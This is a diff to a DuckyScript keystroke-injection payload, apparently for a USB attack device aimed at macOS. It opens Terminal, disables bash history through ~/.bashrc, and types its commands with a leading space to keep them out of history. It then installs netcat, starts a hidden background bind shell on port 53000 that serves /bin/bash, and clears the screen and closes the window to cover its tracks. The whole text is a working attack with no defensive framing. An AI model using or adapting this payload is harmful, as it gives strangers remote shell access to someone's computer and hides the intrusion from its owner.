@@ -36,19 +36,24 @@ DELAY 1000
 GUI SPACE
 DELAY 500
 STRING terminal
+DELAY 1000
+ENTER
+DELAY 1000
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
 DELAY 500
 ENTER
+DELAY 500
+STRING  brew install netcat
+DELAY 250
+ENTER
+DELAY 15000
+STRING  nohup nc -l -p 53000 -vvv -e /bin/bash &
+ENTER
+DELAY 500
+STRING  clear
+ENTER
 DELAY 1000
-STRING brew install netcat
-ENTER
-DELAY 10000
-STRING nohup nc -l -p 53000 -vvv -e /bin/bash &
-ENTER
-DELAY 3500
-STRING clear
-ENTER
-DELAY 1000
-GUI m
+GUI w
 
 
 
